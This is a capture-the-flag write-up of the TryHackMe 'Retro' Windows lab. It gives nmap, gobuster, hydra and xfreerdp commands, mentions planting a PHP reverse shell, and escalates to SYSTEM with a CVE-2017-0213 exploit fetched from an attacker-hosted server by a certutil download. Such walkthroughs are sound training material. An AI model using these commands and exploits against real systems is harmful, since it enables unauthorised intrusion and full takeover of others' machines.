# 🕹️ TryHackMe: Retro - Write-up

* **Platform:** TryHackMe
* **Machine:** Retro
* **OS:** Windows
* **Author:** HERO 🦸‍♂️

---

## 🎯 Executive Summary
In this walkthrough, we explore two different methodologies to gain an initial foothold on the Windows machine. Both paths lead to a successful RDP session. During the privilege escalation phase, automated tools like WinPEAS were blocked by Windows Defender, prompting a manual enumeration approach. This led to the discovery of a vulnerable Windows Server build (10.0.14393), which was successfully exploited using a COM Elevation of Privilege vulnerability (CVE-2017-0213) to achieve `NT AUTHORITY\SYSTEM`.

---

## 🔍 1. Reconnaissance & Enumeration

### Port Scanning
As per standard methodology, we initiate a full-port fast scan, followed by service enumeration on the discovered open ports:

```bash
nmap -p- --min-rate 5000 <TARGET_IP>
nmap -sC -sV -p 80,3389 <TARGET_IP>
The scan reveals two primary entry points:

    Port 80: HTTP Web Server

    Port 3389: RDP (Remote Desktop Protocol)

Web Enumeration & OSINT

Navigating to the web server on port 80, we find a blog-like page containing informational posts in plain text. Digging deeper into the posts and author information, we identify a user named Wade.

Crucially, Wade left a comment explicitly stating: "I will put this here to take remember if I forget [*****]".
As an attacker, uncovering leaked clear-text credentials is a goldmine.
🔓 2. Initial Foothold (Two Paths)

With a valid username (wade) and a potential password, we can approach the initial compromise from two different angles:
Path A: Direct RDP Access (The Fast Way)

Since port 3389 is open, the most logical first step is testing the discovered credentials directly against the RDP service.

xfreerdp /u:wade /p:"<DISCOVERED_PASSWORD>" /v:<TARGET_IP>

Result: Boom! The credentials are valid, and we gain an instant GUI session on the machine.
Path B: WordPress Brute-Forcing (The Web Way)

Alternatively, running directory enumeration with gobuster reveals a hidden WordPress login page (/wp-login.php):

gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt

Knowing this is a WordPress site, we can use hydra to brute-force or validate the credentials via HTTP POST requests:

hydra -l wade -p "<DISCOVERED_PASSWORD>" <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=Invalid username"

hydra -l wade -p "<DISCOVERED_PASSWORD>" <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=Invalid username"

Once inside the WordPress dashboard, we can inject a reverse shell into a PHP template to gain access.
🚀 3. Privilege Escalation (CVE-2017-0213)
Manual Enumeration & AV Evasion

Upon gaining initial access as the user wade, the goal is to escalate privileges to SYSTEM. Initial attempts to run automated enumeration scripts like WinPEAS were intercepted and blocked by the active Windows Defender.

Pivoting to manual enumeration, we check the exact OS version and build number:

systeminfo | findstr /B /C:"OS Name" /C:"OS Version"


The output reveals the host is running Windows Server 2016 Standard, specifically build 10.0.14393.
Exploiting COM (Component Object Model)

Researching this specific build highlights vulnerability to CVE-2017-0213 (Windows COM Elevation of Privilege Vulnerability).

    Staging the Exploit:
    We download the pre-compiled exploit binary (CVE-2017-0213_x64.zip) to our Kali machine and host it using a simple Python web server:

python3 -m http.server 8000


Transferring to the Victim:
Since we have an active RDP session, we can easily transfer the file via clipboard (Copy & Paste) or use the command line:
certutil.exe -urlcache -split -f http://<KALI_IP>:8000/CVE-2017-0213_x64.zip C:\Users\wade\Desktop\exploit.zip


Execution:
    We extract the .zip archive using the native Windows GUI or tar command. Executing the extracted binary spawns a new elevated command prompt.

C:\Users\wade\Desktop> CVE-2017-0213_x64.exe

Checking our privileges in the newly spawned shell:

whoami
> nt authority\system

Root access achieved. Machine fully compromised.

Pwned by HERO 💀🔥



